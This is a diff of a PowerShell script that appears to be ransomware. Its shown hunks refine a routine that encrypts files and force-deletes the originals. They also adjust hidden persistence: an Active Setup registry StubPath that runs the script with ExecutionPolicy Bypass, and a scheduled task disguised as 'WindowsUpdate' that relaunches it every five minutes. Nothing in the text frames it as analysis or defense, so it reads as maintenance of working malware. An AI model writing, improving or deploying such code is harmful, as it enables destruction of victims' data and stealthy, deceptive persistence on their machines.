@@ -6,7 +6,6 @@ param(
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
-Add-Type -AssemblyName System.Security.Cryptography
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -60,7 +59,7 @@ function Encrypt-File {
         $cryptoStream.Write($fileContent, 0, $fileContent.Length)
         $cryptoStream.Close()
         $fileStream.Close()
-        Remove-Item $FilePath -Force
+        Remove-Item $FilePath -Force -ErrorAction Stop
         return $true
     }
     catch {
@@ -271,8 +270,8 @@ $activeSetup = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\Windo
 if (!(Test-Path $activeSetup)) { New-Item -Path $activeSetup -Force -ErrorAction SilentlyContinue | Out-Null }
 New-ItemProperty -Path $activeSetup -Name "StubPath" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
 
-$scheduledTask = "schtasks /create /tn `"WindowsUpdate`" /tr `"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `'$scriptPath`'`" /sc minute /mo 5 /f 2>$null"
-Invoke-Expression $scheduledTask | Out-Null
+$scheduledTask = "schtasks /create /tn `"WindowsUpdate`" /tr `"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `'$scriptPath`'`" /sc minute /mo 5 /f"
+Invoke-Expression $scheduledTask 2>$null | Out-Null
 
 Start-Job -ScriptBlock { 
     while ($true) { 
